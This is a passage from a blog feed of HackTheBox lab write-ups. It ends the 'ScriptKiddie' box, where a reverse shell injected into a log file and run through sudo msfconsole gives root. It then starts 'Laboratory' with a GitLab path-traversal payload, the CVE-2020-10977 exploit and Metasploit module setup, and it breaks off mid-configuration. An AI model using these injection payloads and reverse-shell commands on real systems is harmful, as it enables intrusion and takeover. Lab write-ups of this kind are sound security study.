</span></span></code></pre></div><p>Looking at the source code of the hosted web, it turns out that the log record consists of date and IP address. The logging happens when someone trying to insert a malicious input to the kid&rsquo;s hack tools.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">...&lt;</span><span class="n">SNIP</span><span class="o">&gt;...</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">searchsploit</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">srcip</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">regex_alphanum</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;searchsploit&#39;</span><span class="p">,</span> <span class="s1">&#39;--color&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">searchsploit</span><span class="o">=</span><span class="n">result</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">,</span> <span class="s1">&#39;ignore&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/home/kid/logs/hackers&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[</span><span class="si">{</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="si">}</span><span class="s1">] </span><span class="si">{</span><span class="n">srcip</span><span class="si">}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">sserror</span><span class="o">=</span><span class="s2">&#34;stop hacking me - well hack you back&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">...&lt;</span><span class="n">SNIP</span><span class="o">&gt;...</span>
</span></span></code></pre></div><p>For example, I can trigger an event that logs my IP in the <code>hackers</code> log file by inserting <code>-v apache</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210614114025066.png" alt="image-20210614114025066"  /></div>
</p>
<p>Or I could generate the same log format in one line:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ python3 -c <span class="s2">&#34;from datetime import datetime; print(f&#39;[{datetime.now()}] 127.0.0.1&#39;)&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>2021-06-14 00:43:54.924946<span class="o">]</span> 127.0.0.1
</span></span></code></pre></div><p>I could guess that the <code>scanlosers.sh</code> is intended as a &lsquo;counter attack&rsquo;. From here, I know that <code>scanlosers.sh</code> will be <strong>executed automatically</strong>.</p>
<p>To exploit the script, I have to trick this line from <code>scanlosers.sh</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">$log</span> <span class="p">|</span> cut -d<span class="s1">&#39; &#39;</span> -f3- <span class="p">|</span> sort -u
</span></span></code></pre></div><p>What that line does is it extracts the IP address from the log.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ <span class="nv">log</span><span class="o">=</span><span class="s1">&#39;[2021-06-14 00:28:09.560444] 127.0.0.1&#39;</span>
</span></span><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="nv">$log</span> <span class="p">|</span> cut -d<span class="s1">&#39; &#39;</span> -f3- <span class="p">|</span> sort -u
</span></span><span class="line"><span class="cl">127.0.0.1
</span></span></code></pre></div><p>From here, I&rsquo;ll just add a semi-colon and a space before putting my reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;
</span></span></code></pre></div><p>It becomes a stacked command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;&#34;</span> <span class="p">|</span> cut -d<span class="s1">&#39; &#39;</span> -f3- <span class="p">|</span> sort -u
</span></span><span class="line"><span class="cl">127.0.0.1<span class="p">;</span> bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;</span><span class="p">;</span>
</span></span></code></pre></div><p>If I map that format to this line:</p>
<pre tabindex="0"><code>sh -c &#34;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null&#34;
</code></pre><p>It turns into this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sh -c <span class="s2">&#34;nmap --top-ports 10 -oN recon/127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;.nmap 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;; 2&gt;&amp;1 &gt;/dev/null&#34;</span>
</span></span></code></pre></div><h4 id="exploitation">Exploitation</h4>
<p>Since the logs is cleared automatically, I&rsquo;ll use while loop to keep inserting my malicious log to the <code>hackers</code> file and I&rsquo;ll wait on my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~/logs$ <span class="k">while</span> sleep 0.1<span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="s2">&#34;[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9001 0&gt;&amp;1&#39;;&#34;</span> &gt; hackers<span class="p">;</span> <span class="k">done</span>
</span></span></code></pre></div><p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">→ root@kali «scriptkiddie» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9001</span>             
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.226<span class="o">]</span> <span class="m">33110</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>868<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">pwn@scriptkiddie:~$ id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>pwn<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>pwn<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>pwn<span class="o">)</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210614115903137.png" alt="image-20210614115903137"  /></div>
</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="sudo---msfconsole">Sudo - msfconsole</h4>
<p>User <code>pwn</code> is allowed to run <code>msfconsole</code> as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwn@scriptkiddie:~$ sudo -l
</span></span><span class="line"><span class="cl">sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> pwn on scriptkiddie:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User pwn may run the following commands on scriptkiddie:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
</span></span></code></pre></div><p>To exploit this I can just send a reverse shell using  <code>-x</code> options and then I&rsquo;ll wait on my <code>nc</code> listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwn@scriptkiddie:~$ sudo msfconsole -q -x <span class="s1">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9005 0&gt;&amp;1&#34;&#39;</span>
</span></span></code></pre></div><p>And I&rsquo;m rooted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «scriptkiddie» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ rlwrap nc -nvlp <span class="m">9005</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9005</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.226<span class="o">]</span> <span class="m">43512</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>868<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">root@scriptkiddie:/home/pwn# id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">root@scriptkiddie:/home/pwn# cut -c-15 /root/root.txt
</span></span><span class="line"><span class="cl">cut -c-15 /root/root.txt
</span></span><span class="line"><span class="cl">bf7edd4c58e4420
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210614121311990.png" alt="image-20210614121311990"  /></div>
</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Laboratory</title>
      <link>https://fahmifj.github.io/hackthebox/laboratory/</link>
      <pubDate>Sat, 17 Apr 2021 23:25:49 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/laboratory/</guid>
      <description>LFI to RCE on GitLab 12.8.1~12.9.0</description>
      <content:encoded><![CDATA[<p>Laboratory is features an instance of GitLab application in a docker container. The application is known to be vulnerable to an arbitrary file read that can be leveraged to read the application&rsquo;s secret, allowing an attacker to craft his own malicious cookie and perform a de-serialization attack to gain a foothold on the container. Enumerating inside the container reveals a private user repository that contains a pair of SSH keys. The keys allows me to logs into the machine.  From there, I&rsquo;m able to gain a foothold on the box using the SSH private key. There is a SUID binary that calls <code>chmod</code> with relative path, making it vulnerable to path hijacking.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Arbitrary File Read</li>
<li>Adding Metasploit module</li>
<li>Exploiting GitLab 12.8.1~12.9.0</li>
<li>Recover a git repository</li>
<li>SUID exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>Metasploit - Preinstalled in Kali Linux</li>
<li>CVE-2020-10997 Exploit PoC - <a href="https://github.com/thewhiteh4t/cve-2020-10977">https://github.com/thewhiteh4t/cve-2020-10977</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Initial scan with <code>nmap</code> shows 3 ports open, they are SSH on port 22, HTTP on port 80, and HTTPS on port 443.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ nmap -sC -sV -oA scans/10-initial-laboratory 10.10.10.216
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
</span></span><span class="line"><span class="cl">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp  open  http     Apache httpd 2.4.41
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to https://laboratory.htb/
</span></span><span class="line"><span class="cl">443/tcp open  ssl/http Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET POST OPTIONS HEAD
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: The Laboratory
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>laboratory.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:git.laboratory.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>laboratory.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">4096</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-07-05T10:39:28
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2024-03-03T10:39:28
</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   <span class="m">2873</span> 91a5 <span class="m">5022</span> f323 4b95 df98 b61a eb6c
</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: <span class="m">0875</span> 3a7e eef6 8f50 <span class="m">0349</span> 510d 9fbf abc3 c70a a1ca
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>From the scan above, visiting port 80 will be redirected to <code>https://laboratory.htb</code>.</p>
<p>On the HTTPS port, the certificate discloses a subdomain.</p>
<p>From here, I&rsquo;ll add <code>laboratory.htb</code> and <code>git.laboratory.htb</code> as well to <code>/etc/hosts</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.216 laboratory.htb git.laboratory.htb&#39;</span> &gt; /etc/hosts
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---laboratoryhtb">TCP 80 - laboratory.htb</h3>
<p>There is nothing really interesting here.</p>
<p><div class="img-container"><img src="imgs/9437ec2bf9834958a568bc836e4c625f.png" alt="8337f36ab816a0b4af1bcff5b6d79ed8.png"  /></div>
</p>
<h3 id="tcp-443---gitlaboratoryhtb">TCP 443 - git.laboratory.htb</h3>
<p>A GitLab instance is presented on this page.</p>
<p><div class="img-container"><img src="imgs/27df62df2abf49f8bea57f0e8bae36db.png" alt="fe1e6f15f33117cf19d265d7bf02e1f0.png"  /></div>
</p>
<p>I tried to register an account, but GitLab rejected it by saying the email domain was not authorized.</p>
<p><div class="img-container"><img src="imgs/db1d849ef24942aaa0f08c2d16fc6b9b.png" alt="9c894520b4a87fd3f31e567387c472be.png"  /></div>
</p>
<p>I changed my email to <code>iamf@laboratory.htb</code> and it works.</p>
<p>The first thing I do is to check the GitLab version. It is available on the “Help” section and the current version is 12.8.1.</p>
<p><div class="img-container"><img src="imgs/108726d7e7ed445cb6a38d1e080676f9.png" alt="82ce9dcf1da9d53967aa746413c3efed.png"  /></div>
</p>
<p>I found another user on this website named <code>Dexter McPherson</code>. This user has a project called <code>SecureWebsite</code></p>
<p><div class="img-container"><img src="imgs/415abe033a4f4252ba3ac745473a9deb.png" alt="9d2a20bf9637ad08d2615a4f44514ca1.png"  /></div>
</p>
<h4 id="searchsploit">Searchsploit</h4>
<p><code>searchsploit</code> shows several exploits for GitLab. One that stands out is an arbitrary file read vulnerability on version 12.9.0 which might work as well on version 12.8.1.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ searchsploit gitlab
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------- -----------------------------
</span></span><span class="line"><span class="cl">Exploit Title                                                           <span class="p">|</span>  Path
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------- -----------------------------
</span></span><span class="line"><span class="cl">GitLab - <span class="s1">&#39;impersonate&#39;</span> Feature Privilege Escalation                      <span class="p">|</span> ruby/webapps/40236.txt
</span></span><span class="line"><span class="cl">GitLab 11.4.7 - RCE <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>2<span class="o">)</span>                                  <span class="p">|</span> ruby/webapps/49334.py
</span></span><span class="line"><span class="cl">GitLab 11.4.7 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>1<span class="o">)</span>                <span class="p">|</span> ruby/webapps/49257.py
</span></span><span class="line"><span class="cl">GitLab 12.9.0 - Arbitrary File Read                                      <span class="p">|</span> ruby/webapps/48431.txt
</span></span><span class="line"><span class="cl">Gitlab 12.9.0 - Arbitrary File Read <span class="o">(</span>Authenticated<span class="o">)</span>                      <span class="p">|</span> ruby/webapps/49076.py
</span></span><span class="line"><span class="cl">Gitlab 6.0 - Persistent Cross-Site Scripting                             <span class="p">|</span> php/webapps/30329.sh
</span></span><span class="line"><span class="cl">Gitlab-shell - Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                               <span class="p">|</span> linux/remote/34362.rb
</span></span><span class="line"><span class="cl">Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting        <span class="p">|</span> java/webapps/47927.txt
</span></span><span class="line"><span class="cl">NPMJS gitlabhook 0.0.17 - <span class="s1">&#39;repository&#39;</span> Remote Command Execution          <span class="p">|</span> json/webapps/47420.txt
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------- ------------------------------
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-git">Shell as git</h3>
<h4 id="gitlab-cve-2020-10977---manual">GitLab CVE-2020-10977 - Manual</h4>
<blockquote>
<p>CVE-2020-10977:
GitLab EE/CE 8.5 to 12.9 is vulnerable to a path traversal when moving an issue between projects.</p>
</blockquote>
<p>The arbitrary file read vulnerability is classified as CVE-2020–10977. The report can be found at <a href="https://hackerone.com/reports/827052">Hackerone</a>. The researcher also shows how that vulnerability can be turned into a remote code execution.</p>
<p>I&rsquo;ll reproduce the vulnerability by creating two projects. I&rsquo;ll name it as &ldquo;project1&rdquo; and &ldquo;project2&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210422215749261.png" alt="image-20210422215749261"  /></div>
</p>
<p>After that I&rsquo;ll create an issue on &ldquo;project2&rdquo; and fill the issue description with a payload as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">![<span class="nt">a</span>](<span class="na">/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd</span>)
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210422220227988.png" alt="image-20210422220227988"  /></div>
</p>
<p>I&rsquo;ll then move the issue on &ldquo;project2&rdquo; to &ldquo;project1&rdquo;</p>
<p><div class="img-container"><img src="imgs/image-20210422220401958.png" alt="image-20210422220401958"  /></div>
</p>
<p>The payload will then turn into an attached file.</p>
<p><div class="img-container"><img src="imgs/image-20210422220539185.png" alt="image-20210422220539185"  /></div>
</p>
<p>The attached file contains the content of <code>/etc/passwd</code> file from the system.</p>
<p><div class="img-container"><img src="imgs/image-20210422220624344.png" alt="image-20210422220624344"  /></div>
</p>
<h4 id="gitlab-cve-2020-10977---automated">GitLab CVE-2020-10977 - Automated</h4>
<p>There is also an <a href="https://github.com/thewhiteh4t/cve-2020-10977">automated version</a> to exploit this vulnerability written in Python.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ python3 cve_2020_10977.py https://git.laboratory.htb/ iamf iamfiamf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Target        : https://git.laboratory.htb
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Username      : iamf
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Password      : iamfiamf
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Project Names : ProjectOne, ProjectTwo
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Trying to Login...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Login Successful!
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Creating ProjectOne...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> ProjectOne Created Successfully!
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Creating ProjectTwo...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> ProjectTwo Created Successfully!
</span></span><span class="line"><span class="cl"><span class="o">[</span>&gt;<span class="o">]</span> Absolute Path to File : /etc/passwd
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Creating an Issue...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Issue Created Successfully!
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Moving Issue...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Issue Moved Successfully!
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> File URL : https://git.laboratory.htb/iamf/ProjectTwo/uploads/9335567cda468be5d53e6ddcca1412e4/passwd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; /etc/passwd
</span></span><span class="line"><span class="cl">----------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">git:x:998:998::/var/opt/gitlab:/bin/sh
</span></span><span class="line"><span class="cl">gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
</span></span><span class="line"><span class="cl">gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
</span></span><span class="line"><span class="cl">gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
</span></span><span class="line"><span class="cl">mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
</span></span><span class="line"><span class="cl">registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
</span></span><span class="line"><span class="cl">gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
</span></span><span class="line"><span class="cl">gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><h4 id="lfi-to-rce">LFI to RCE</h4>
<p>To turns this arbitrary file read vulnerability into a remote code execution, I’ll need to setup my own GitLab instance with the same version as the one on Laboratory. Then I’ll have to replace my GitLab <code>secret_key_base</code> with the one on Laboratory (located on <code>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code>).  After that all is set, I&rsquo;ve to craft my own cookie to get the code execution on the system.</p>
<p>Fortunately, there is a Metasploit <a href="https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/">module</a> to perform this automatically, and I’ll use that.</p>
<p>First, I’ll have to grab the module from GitHub and put it into <code>/usr/share/metasploit-framework/modules/exploits/multi/http</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> /usr/share/metasploit-framework/modules/exploits/multi/http <span class="o">&amp;&amp;</span> wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/gitlab_file_read_rce.rb
</span></span></code></pre></div><p>After that I’ll re-initialize the metasploit database using <code>msfdb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ msfdb reinit
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting database
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Dropping databases <span class="s1">&#39;msf&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Dropping databases <span class="s1">&#39;msf_test&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Dropping database user <span class="s1">&#39;msf&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Deleting configuration file /usr/share/metasploit-framework/config/database.yml
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Stopping database
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting database
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating database user <span class="s1">&#39;msf&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating databases <span class="s1">&#39;msf&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating databases <span class="s1">&#39;msf_test&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating configuration file <span class="s1">&#39;/usr/share/metasploit-framework/config/database.yml&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating initial database schema
</span></span></code></pre></div><p>Now on Metasploit, I can use the module by issuing the command below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 &gt; use exploit/multi/http/gitlab_file_read_rce
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> No payload configured, defaulting to generic/shell_reverse_tcp
</span></span></code></pre></div><p>Below are the options needed by the module.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> USERNAME iamf
</span></span><span class="line"><span class="cl"><span class="nv">USERNAME</span> <span class="o">=</span>&gt; iamf
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> PASSWORD iamfiamf
</span></span><span class="line"><span class="cl"><span class="nv">PASSWORD</span> <span class="o">=</span>&gt; iamfiamf
